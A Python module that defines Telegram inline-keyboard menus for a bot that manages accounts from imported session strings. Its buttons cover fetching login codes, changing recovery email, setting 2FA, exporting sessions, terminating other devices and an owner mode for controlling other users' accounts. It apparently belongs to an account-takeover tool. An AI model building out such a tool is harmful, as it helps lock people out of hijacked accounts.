from telegram import InlineKeyboardButton, InlineKeyboardMarkup

# Callback-data convention: values are separated with ":" (never "|").
# Button styles (Bot API 9.4+ / PTB 22.7+):
#   primary  → blue
#   success  → green
#   danger   → red
#   (omit)   → default / app theme


def main_menu_kb():
    kb = [
        [
            InlineKeyboardButton("🔑 Manage Account", callback_data="manage_account", style="primary"),
            InlineKeyboardButton("🛡️ Safe / Guard", callback_data="guard_account", style="primary"),
        ],
        [InlineKeyboardButton("👤 My Accounts", callback_data="my_accounts", style="success")],
    ]
    return InlineKeyboardMarkup(kb)


def admin_back_kb():
    kb = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_main", style="primary")]]
    return InlineKeyboardMarkup(kb)


# ── Manage dashboard (after sending hex) ─────────────────────────────────────
def manage_dashboard_kb(guard_active: bool = False):
    guard_label = "🛡️ Guard: ON" if guard_active else "🛡️ Safe Guard: OFF"
    kb = [
        [
            InlineKeyboardButton("📱 Device Dashboard", callback_data="mng_devices", style="primary"),
            InlineKeyboardButton("🗑️ Clear All", callback_data="mng_clear_all", style="danger"),
        ],
        [
            InlineKeyboardButton("📨 Fetch OTP", callback_data="mng_fetch_otp", style="success"),
            InlineKeyboardButton("📧 Change Mail", callback_data="mng_change_mail", style="primary"),
        ],
        [
            InlineKeyboardButton("🧪 Check Mail", callback_data="mail_check", style="primary"),
            InlineKeyboardButton("🔐 2FA", callback_data="mng_2fa", style="primary"),
        ],
        [
            InlineKeyboardButton("📤 Export Hex", callback_data="mng_export_hex", style="success"),
            InlineKeyboardButton(guard_label, callback_data="mng_guard_toggle", style="success" if guard_active else "primary"),
        ],
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_main", style="primary")],
    ]
    return InlineKeyboardMarkup(kb)


def device_dashboard_kb(devices: list, guard_active: bool = False):
    """One button per device + guard toggle + revoke-all + revoke-bot + back."""
    kb = []
    for i, dev in enumerate(devices):
        model = (dev.get("device_model") or "Unknown")[:18]
        platform = (dev.get("platform") or "")[:12]
        cur = " 🤖 BOT" if dev.get("current") else ""
        label = f"📱 {i + 1}. {model} · {platform}{cur}"
        kb.append([InlineKeyboardButton(label, callback_data=f"dev:{i}", style="primary")])

    kb.append([
        InlineKeyboardButton("🔌 Terminate All Other Sessions", callback_data="revoke_all", style="danger"),
    ])
    guard_label = "🛡️ Guard: ON" if guard_active else "🛡️ Guard: OFF"
    kb.append([
        InlineKeyboardButton(guard_label, callback_data="guard_toggle", style="success" if guard_active else "primary"),
    ])
    kb.append([
        InlineKeyboardButton("🔴 Revoke Bot Connection", callback_data="revoke_bot", style="danger"),
    ])
    kb.append([
        InlineKeyboardButton("🔙 Back to Dashboard", callback_data="mng_back_dash", style="primary"),
    ])
    return InlineKeyboardMarkup(kb)


def terminate_confirm_kb(device_idx: int):
    kb = [
        [
            InlineKeyboardButton("✅ Yes, Terminate", callback_data=f"dev_yes:{device_idx}", style="danger"),
            InlineKeyboardButton("❌ Cancel", callback_data="dev_no", style="primary"),
        ]
    ]
    return InlineKeyboardMarkup(kb)


def revoke_bot_confirm_kb():
    kb = [
        [
            InlineKeyboardButton("🔴 Yes, Revoke & Remove", callback_data="revoke_bot_yes", style="danger"),
            InlineKeyboardButton("❌ Cancel", callback_data="dev_no", style="primary"),
        ]
    ]
    return InlineKeyboardMarkup(kb)


def clear_all_confirm_kb():
    kb = [
        [
            InlineKeyboardButton("✅ Yes, Clear Everything", callback_data="clr_yes", style="danger"),
            InlineKeyboardButton("❌ Cancel", callback_data="clr_no", style="primary"),
        ]
    ]
    return InlineKeyboardMarkup(kb)


def otp_menu_kb():
    kb = [
        [InlineKeyboardButton("📨 Read Latest OTP", callback_data="otp_read", style="success")],
        [InlineKeyboardButton("🔙 Back to Dashboard", callback_data="mng_back_dash", style="primary")],
    ]
    return InlineKeyboardMarkup(kb)


def back_to_dashboard_kb():
    kb = [[InlineKeyboardButton("🔙 Back to Dashboard", callback_data="mng_back_dash", style="primary")]]
    return InlineKeyboardMarkup(kb)


def cancel_kb(action: str):
    kb = [[InlineKeyboardButton("❌ Cancel", callback_data=f"cancel_{action}", style="primary")]]
    return InlineKeyboardMarkup(kb)


def change_mail_options_kb(has_saved_mail: bool = False, prefix: str = "mng"):
    """
    Options shown when starting Change Login Email.
    prefix = "mng" for Manage Account flow, "fo" for Full Ops.
    """
    kb = []
    if has_saved_mail:
        kb.append([
            InlineKeyboardButton(
                "⚡ Use Saved Mail (auto + variants)",
                callback_data=f"{prefix}_mail_auto",
                style="success",
            )
        ])
    kb.append([
        InlineKeyboardButton("✏️ Enter email manually", callback_data=f"{prefix}_mail_manual", style="primary")
    ])
    kb.append([
        InlineKeyboardButton("❌ Cancel", callback_data=f"cancel_{'change_mail' if prefix == 'mng' else 'fo_mail'}", style="primary")
    ])
    return InlineKeyboardMarkup(kb)


def change_mail_confirm_kb():
    kb = [
        [InlineKeyboardButton("✅ Yes, Change Mail", callback_data="cm_yes", style="success")],
        [InlineKeyboardButton("❌ Cancel", callback_data="cm_no", style="primary")],
    ]
    return InlineKeyboardMarkup(kb)


def twofa_menu_kb():
    """2FA management menu."""
    kb = [
        [InlineKeyboardButton("🔐 Set / Change 2FA Password", callback_data="2fa_set", style="primary")],
        [InlineKeyboardButton("🗑️ Remove 2FA Password", callback_data="2fa_remove", style="danger")],
        [InlineKeyboardButton("ℹ️ Check 2FA Status", callback_data="2fa_status", style="primary")],
        [InlineKeyboardButton("🔙 Back", callback_data="mng_back_dash", style="primary")],
    ]
    return InlineKeyboardMarkup(kb)


# ── My Accounts ──────────────────────────────────────────────────────────────
def accounts_pagination_kb(accounts: list, page: int, total_pages: int):
    kb = []
    start = page * 5
    end = min(start + 5, len(accounts))

    for i in range(start, end):
        acc = accounts[i]
        label = f"📱 {acc.get('name', 'Unknown')} ({acc.get('phone', 'Unknown')})"
        kb.append([InlineKeyboardButton(label, callback_data=f"acc_view:{acc['_id']}", style="primary")])

    nav_row = []
    if page > 0:
        nav_row.append(InlineKeyboardButton("◀️ Prev", callback_data=f"acc_page:{page - 1}", style="primary"))
    if page < total_pages - 1:
        nav_row.append(InlineKeyboardButton("Next ▶️", callback_data=f"acc_page:{page + 1}", style="primary"))
    if nav_row:
        kb.append(nav_row)

    kb.append([InlineKeyboardButton("🔄 Refresh", callback_data="acc_refresh", style="success")])
    kb.append([InlineKeyboardButton("🔙 Main Menu", callback_data="back_main", style="primary")])
    return InlineKeyboardMarkup(kb)


def account_detail_kb(account_id: str, guard_active: bool = False):
    guard_label = "🛡️ Guard: ON" if guard_active else "🛡️ Guard: OFF"
    kb = [
        [
            InlineKeyboardButton("📨 Fetch OTP", callback_data=f"acc_otp:{account_id}", style="success"),
            InlineKeyboardButton("🔌 Revoke Bot", callback_data=f"acc_revoke:{account_id}", style="danger"),
        ],
        [
            InlineKeyboardButton("🔓 Allow Login (60s)", callback_data=f"acc_allow:{account_id}", style="success"),
        ],
        [InlineKeyboardButton(guard_label, callback_data=f"acc_guard:{account_id}", style="success" if guard_active else "primary")],
        [InlineKeyboardButton("⚙️ Full Operations", callback_data=f"acc_fullops:{account_id}", style="primary")],
        [InlineKeyboardButton("🔙 Back to Accounts", callback_data="acc_back", style="primary")],
    ]
    return InlineKeyboardMarkup(kb)


def full_operations_kb(account_id: str, guard_active: bool = False):
    """Full operations menu for a saved account (My Accounts → Full Operations)."""
    guard_label = "🛡️ Guard: ON" if guard_active else "🛡️ Safe Guard: OFF"
    kb = [
        [
            InlineKeyboardButton("📱 Device Dashboard", callback_data=f"fo_devices:{account_id}", style="primary"),
            InlineKeyboardButton("🗑️ Clear All", callback_data=f"fo_clear:{account_id}", style="danger"),
        ],
        [
            InlineKeyboardButton("📨 Fetch OTP", callback_data=f"fo_otp:{account_id}", style="success"),
            InlineKeyboardButton("📧 Change Mail", callback_data=f"fo_changemail:{account_id}", style="primary"),
        ],
        [
            InlineKeyboardButton("🧪 Check Mail", callback_data=f"fo_checkmail:{account_id}", style="primary"),
            InlineKeyboardButton("🔐 2FA", callback_data=f"fo_2fa:{account_id}", style="primary"),
        ],
        [
            InlineKeyboardButton("📤 Export Hex", callback_data=f"fo_export:{account_id}", style="success"),
            InlineKeyboardButton(guard_label, callback_data=f"fo_guard:{account_id}", style="success" if guard_active else "primary"),
        ],
        [InlineKeyboardButton("🔙 Back to Account", callback_data=f"acc_view:{account_id}", style="primary")],
    ]
    return InlineKeyboardMarkup(kb)


def fo_back_kb(account_id: str):
    """Back button that returns to Full Operations menu."""
    kb = [[InlineKeyboardButton("🔙 Back to Full Ops", callback_data=f"acc_fullops:{account_id}", style="primary")]]
    return InlineKeyboardMarkup(kb)



def fo_device_dashboard_kb(account_id: str, devices: list, guard_active: bool = False):
    """Full Ops device list — terminate, revoke all, revoke bot."""
    kb = []
    for i, dev in enumerate(devices):
        model = (dev.get("device_model") or "Unknown")[:18]
        platform = (dev.get("platform") or "")[:12]
        cur = " 🤖 BOT" if dev.get("current") else ""
        label = f"📱 {i + 1}. {model} · {platform}{cur}"
        kb.append([InlineKeyboardButton(label, callback_data=f"fo_dev:{account_id}:{i}", style="primary")])

    kb.append([
        InlineKeyboardButton("🔌 Terminate All Other", callback_data=f"fo_revoke_all:{account_id}", style="danger"),
    ])
    guard_label = "🛡️ Guard: ON" if guard_active else "🛡️ Guard: OFF"
    kb.append([
        InlineKeyboardButton(guard_label, callback_data=f"fo_guard:{account_id}", style="success" if guard_active else "primary"),
    ])
    kb.append([
        InlineKeyboardButton("🔴 Revoke Bot Connection", callback_data=f"fo_revoke_bot:{account_id}", style="danger"),
    ])
    kb.append([
        InlineKeyboardButton("🔙 Back to Full Ops", callback_data=f"acc_fullops:{account_id}", style="primary"),
    ])
    return InlineKeyboardMarkup(kb)


def fo_terminate_confirm_kb(account_id: str, device_idx: int):
    kb = [
        [
            InlineKeyboardButton("✅ Yes, Terminate", callback_data=f"fo_dev_yes:{account_id}:{device_idx}", style="danger"),
            InlineKeyboardButton("❌ Cancel", callback_data=f"fo_devices:{account_id}", style="primary"),
        ]
    ]
    return InlineKeyboardMarkup(kb)


def fo_revoke_bot_confirm_kb(account_id: str):
    kb = [
        [
            InlineKeyboardButton("🔴 Yes, Revoke & Remove", callback_data=f"fo_revoke_bot_yes:{account_id}", style="danger"),
            InlineKeyboardButton("❌ Cancel", callback_data=f"fo_devices:{account_id}", style="primary"),
        ]
    ]
    return InlineKeyboardMarkup(kb)


def fo_clear_confirm_kb(account_id: str):
    kb = [
        [
            InlineKeyboardButton("✅ Yes, Clear Everything", callback_data=f"fo_clear_yes:{account_id}", style="danger"),
            InlineKeyboardButton("❌ Cancel", callback_data=f"acc_fullops:{account_id}", style="primary"),
        ]
    ]
    return InlineKeyboardMarkup(kb)

def fo_twofa_kb(account_id: str):
    kb = [
        [InlineKeyboardButton("🔐 Set / Change 2FA", callback_data=f"fo_2fa_set:{account_id}", style="primary")],
        [InlineKeyboardButton("🗑️ Remove 2FA", callback_data=f"fo_2fa_remove:{account_id}", style="danger")],
        [InlineKeyboardButton("ℹ️ Check 2FA Status", callback_data=f"fo_2fa_status:{account_id}", style="primary")],
        [InlineKeyboardButton("🔙 Back", callback_data=f"acc_fullops:{account_id}", style="primary")],
    ]
    return InlineKeyboardMarkup(kb)


# ── Guard ────────────────────────────────────────────────────────────────────
def guard_back_kb():
    kb = [
        [InlineKeyboardButton("🛡️ Guard Status", callback_data="guard_status", style="primary")],
        [InlineKeyboardButton("🛑 Deactivate Guard", callback_data="guard_deactivate", style="danger")],
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_main", style="primary")],
    ]
    return InlineKeyboardMarkup(kb)


# ── Owner Access (control other users) ───────────────────────────────────────
def owner_access_accounts_kb(accounts: list, target_user_id: int, page: int = 0):
    """Owner viewing another user's accounts."""
    kb = []
    start = page * 5
    end = min(start + 5, len(accounts))
    for i in range(start, end):
        acc = accounts[i]
        label = f"📱 {acc.get('name', 'Unknown')} ({acc.get('phone', 'Unknown')})"
        kb.append([InlineKeyboardButton(
            label, callback_data=f"oa_view:{target_user_id}:{acc['_id']}", style="primary"
        )])
    kb.append([InlineKeyboardButton("🔙 Cancel Access", callback_data="back_main", style="primary")])
    return InlineKeyboardMarkup(kb)


def owner_full_ops_kb(target_user_id: int, account_id: str, guard_active: bool = False):
    """Full ops when owner is controlling another user's account."""
    guard_label = "🛡️ Guard: ON" if guard_active else "🛡️ Safe Guard: OFF"
    prefix = f"oafo:{target_user_id}:{account_id}"
    kb = [
        [
            InlineKeyboardButton("📱 Device Dashboard", callback_data=f"{prefix}:devices", style="primary"),
            InlineKeyboardButton("🗑️ Clear All", callback_data=f"{prefix}:clear", style="danger"),
        ],
        [
            InlineKeyboardButton("📨 Fetch OTP", callback_data=f"{prefix}:otp", style="success"),
            InlineKeyboardButton("📤 Export Hex", callback_data=f"{prefix}:export", style="success"),
        ],
        [
            InlineKeyboardButton(guard_label, callback_data=f"{prefix}:guard", style="success" if guard_active else "primary"),
        ],
        [InlineKeyboardButton("🔙 Back", callback_data=f"oa_view:{target_user_id}:{account_id}", style="primary")],
    ]
    return InlineKeyboardMarkup(kb)
